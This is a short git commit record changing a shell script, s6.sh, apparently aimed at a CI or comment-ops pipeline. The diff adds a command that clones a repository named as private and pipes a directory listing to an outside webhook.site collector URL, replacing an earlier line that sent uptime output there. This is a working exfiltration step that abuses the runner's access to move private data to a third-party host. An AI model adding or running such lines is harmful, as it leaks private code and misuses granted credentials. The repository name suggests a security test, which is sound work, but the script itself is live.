5304581cd1a9648f6ab25730c63cabcf0f54dd14
Mauricio <uaxp123@gmail.com>
2021-11-03 02:49:05 -0500

    Update s6.sh

--- s6.sh
+++ s6.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
 
-uptime | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=
+gh  repo clone incrediblysecureinc/comment-ops-private-amauricio
+ls | curl --data-urlencode time@-  https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22?second=
 
